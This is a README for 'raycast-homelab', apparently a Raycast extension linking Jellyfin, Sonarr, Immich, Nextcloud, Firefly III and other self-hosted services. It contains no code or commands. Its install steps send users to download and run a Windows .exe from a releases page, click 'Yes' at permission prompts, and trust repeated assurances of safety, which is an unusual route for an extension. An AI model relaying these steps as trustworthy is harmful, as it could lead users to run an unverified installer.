# 🔧 raycast-homelab - Your entire homelab, one command away

[![Download raycast-homelab](https://img.shields.io/badge/Download%20raycast--homelab-Click%20Here-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=00FF7F)](https://github.com/MxldDev/raycast-homelab/releases)

## 🎯 What Is This?

Imagine having every part of your home server setup—your movies, music, photos, bookmarks, and monitoring tools—all available from a single, fast, and easy-to-use menu. That's exactly what **raycast-homelab** does.  

It's a special helper tool (called an "extension") that works with the popular Raycast launcher. But don't worry if you've never heard of Raycast—think of it like a super-powered search bar for your computer. This extension adds 23 handy commands and a central "Home" hub that connects to your favorite self-hosted services.

**In plain words:** Instead of opening 10 different websites or apps to check your homelab, you get one clean, friendly control panel. Everything is optional—you only set up the parts you actually use.

## ✨ What Can You Do With It?

Here's what you'll find inside once it's set up:

### 🏠 The Home Hub
A single starting screen that shows you the status of your connected services. You can see if something is offline, quickly open a service, or jump straight into a specific action—all without typing a single web address.

### 📺 Media & Entertainment
- **Jellyfin** – Watch your movies and shows, control playback, and browse your library.
- **Jellyseerr** – Request new movies or shows for your server.
- **Radarr** – Find and add new movies to your collection.
- **Sonarr** – Automatically grab new episodes of your favorite TV series.
- **Lidarr** – Manage your music library and search for new artists.

### 📚 Books & Audiobooks
- **Audiobookshelf** – Browse, search, and listen to your audiobooks and podcasts.

### 🗂️ Files & Photos
- **Nextcloud** – Quickly access your cloud files, upload new ones, or check storage space.
- **Immich** – View your photo backup, search by date or location, and upload new pictures.

### 📊 Monitoring & Finances
- **Uptime Kuma** – Check if your websites and servers are online, and see recent uptime reports.
- **Firefly III** – Look at your recent expenses, add a new transaction, or check your budget.

### 🔌 More Services
- The extension is built so more services can be added later. If you only use a few, that's completely fine—you only enable the ones you need.

## 🚀 Getting Started (Windows)

Follow these steps exactly. It takes less than five minutes.

### Step 1: Get the Application

Visit this link to download the application:  
👉 [**Download raycast-homelab**](https://github.com/MxldDev/raycast-homelab/releases)

On that page, you'll see a list of files. Look for the newest version at the top. Click the download button that matches your system (the file name usually ends with `.exe` for Windows). Your browser will save it to your "Downloads" folder.

### Step 2: Run the Installer

Go to your Downloads folder, find the file you just downloaded, and double-click it. A small window might pop up asking for permission—click **"Yes"** or **"Run"**. The installation will start automatically. Just follow the simple on-screen prompts (click "Next" or "Install" until it's done).

### Step 3: Open Raycast (If You Don't Have It)

If you already use Raycast, skip this step. If not, download Raycast from the official website (search "Raycast for Windows" on your browser). It's a free, safe tool. Once installed, open Raycast by pressing your configured hotkey (usually `Alt+Space` or `Ctrl+Space`).

### Step 4: Connect Your Services

After installing raycast-homelab, open Raycast and type "homelab". You'll see the Home Hub. On your first launch, it will ask you to add your services. For each one:

- Type in the **web address** of that service (like `http://192.168.1.100:8096` for Jellyfin).
- Enter your **API key** if you have one (found in that service's settings).
- Click **Save**.

Only add what you use—leave everything else blank.

### Step 5: Start Using It

Now just type "homelab" in Raycast whenever you want to see your dashboard. From there, you can pick any command. You can also type things like "jellyfin search" or "sonarr add" directly in Raycast to jump straight to that action.

## ❓ Frequently Asked Questions

### Do I need to be a programmer to use this?
No. The whole point is to make your homelab easy. The setup is all fill-in-the-blank, and the interface is simple buttons and lists.

### Is it safe to use with my home server?
Yes. It connects directly to your services, usually on your local network. Your data stays on your computer. You can also remove or disable any service at any time.

### What if I don't have all these services?
No problem. Each service is optional. The extension works just as well with one service or ten. It simply shows what you've connected.

### Can I change or uninstall it later?
Yes. Uninstalling works like any Windows app—go to Settings → Apps → Installed Apps, find "raycast-homelab," and click Uninstall. Your services are not touched; only the extension is removed.

### How do I get updates?
When a new version is released, you'll get a notification through Raycast. Download the new file from the same link and run it—your settings will be kept.

## 🧩 Troubleshooting Tips

- **Nothing appears when I type "homelab"?** Make sure you've finished the installation and restarted Raycast (close it completely and reopen).
- **A service says "offline"?** Double-check the address you typed. Make sure the service is running and that your computer can reach it (try opening that address in your browser).
- **Forgot a password or API key?** Look in the settings of that specific service (like Jellyfin or Nextcloud) to find your key. It's usually under "API Keys" or "Tokens."

## 🤝 Want to Contribute?

This project is open-source, which means anyone can help improve it. If you're comfortable with coding, you can report bugs, suggest new features, or even add support for new services. Check the repository's "Issues" tab to see what's being worked on.

## 📄 License & Credits

raycast-homelab is free to use under the MIT license. It was built by the homelab community for the homelab community—with a big thank you to all the developers who keep these amazing self-hosted tools running.

## 🏁 Final Checklist

- [ ] You downloaded the app from the link above.
- [ ] You ran the installer and followed the prompts.
- [ ] You have Raycast installed (or already had it).
- [ ] You typed "homelab" in Raycast and connected at least one service.
- [ ] You're enjoying one-click access to your whole homelab.

That's it. Welcome to a simpler, faster way to manage your home server—all from one friendly place. Go ahead and try it now:

👉 [**Download your copy here**](https://github.com/MxldDev/raycast-homelab/releases)

Keywords: audiobookshelf, firefly-iii, homelab, immich, jellyfin, jellyseerr, lidarr, nextcloud, radarr, raycast, raycast-extension, self-hosted, sonarr, uptime-kuma